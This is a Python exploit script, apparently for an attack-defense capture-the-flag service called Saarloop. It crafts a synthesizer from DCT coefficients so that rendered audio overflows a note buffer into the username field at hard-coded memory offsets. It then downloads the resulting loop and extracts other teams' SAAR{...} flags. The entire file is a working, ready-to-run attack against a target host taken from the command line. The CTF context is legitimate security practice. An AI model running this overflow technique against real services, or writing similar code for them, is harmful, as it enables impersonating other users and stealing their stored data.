import math
import random
import re
import string

import scipy.fft

from saarloop_api import SaarloopAPI


def random_str(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


def parse_flags_bytes(content):
    return [x.decode() for x in re.findall(rb'SAAR{[0-9A-Za-z_-]{32}}', content)]


def get_coeffs(target):
    """
    return dct coefficients for easy "backwards" use with plain cosine functions
    """
    return scipy.fft.dct(to_float(target), type=3, norm="forward")


def to_float(data):
    return [2 * x / 255.0 - 1.0 for x in data]


def to_bytes(data):
    return bytes(int(round(255 * (x + 1.0) / 2.0)) for x in data)


def bytes_to_synth(data):
    coeffs = get_coeffs(data)
    oscs = [
        {"type": "SINE", "vol": 2 * c, "phase": math.pi / 2, "fmult": (i + 1 / 2)}
        for i, c in enumerate(coeffs)
    ]
    return {"oscs": oscs}


SAMPLE_RATE = 11025
BPM = 120


def _exploit_synth(target, flag_id):
    target_user = flag_id.split(':', maxsplit=1)[0]
    target_synth = flag_id.rsplit('/', maxsplit=1)[1]

    username = f'{random_str(8)}'
    password = random_str(8)

    api = SaarloopAPI(f'http://{target}:11025')
    api.register(username, password)

    # let's hope that these remain stable over different compilations...
    NOTE_BUFFER = 0x000000000000d560
    USERNAME = 0x0000000000011560

    buf_len = (USERNAME - NOTE_BUFFER)
    write_len = buf_len + len(target_user) + 1  # fill buffer + username + NULL-byte

    cycle_len = 63  # 1/4 oscillation = 63 samples

    target_bytes = target_user.encode().ljust(cycle_len, b'\x00')

    exploit_synth = bytes_to_synth(target_bytes)

    offset = buf_len % (4 * cycle_len)

    # adjust oscillator phases to account for offset
    base_freq = 175 / 2  # Hz
    for osc in exploit_synth['oscs']:
        osc['phase'] = math.fmod(osc['phase'] - (offset * osc['fmult'] * base_freq * 2 * math.pi / SAMPLE_RATE),
                                 2 * math.pi)

    exploit_synth_name = random_str(8)

    api.create_synth(exploit_synth_name, exploit_synth)

    note_duration = (write_len * BPM) / (SAMPLE_RATE * 60)

    exploit_loop = {
        "bpm": BPM,
        "length": 4,
        "tracks": [
            {
                "type": "SYNTH_USER",
                "id": exploit_synth_name,
                "vol": 1.0,
                "env": {"a": 0, "d": 0, "s": 1.0, "r": 0},
                "notes": [{
                    "p": 41, "t": 1, "d": note_duration
                }]
            },
            {
                "type": "SYNTH_USER",
                "id": target_synth,
                "vol": 1.0,
                "env": {"a": 0, "d": 0, "s": 1.0, "r": 0},
                "notes": [{
                    "p": 41, "t": 0, "d": 1
                }]
            }
        ]
    }

    exploit_loop_name = random_str(8)

    exploit_loop_id = api.create_loop(exploit_loop_name, exploit_loop)

    return parse_flags_bytes(api.download_loop(exploit_loop_id))


def exploit(target, *flag_ids_args):
    for synth_flag_ids in flag_ids_args:
        for flag_id in synth_flag_ids:
            if 'synth' in flag_id:
                try:
                    print(f'Attempting to leak flag for {flag_id=}')
                    for flag in _exploit_synth(target, flag_id):
                        print(flag)
                except:
                    pass


if __name__ == '__main__':
    import sys

    exploit(sys.argv[1] if len(sys.argv) > 1 else 'localhost', *[x.split(',') for x in sys.argv[2:]])
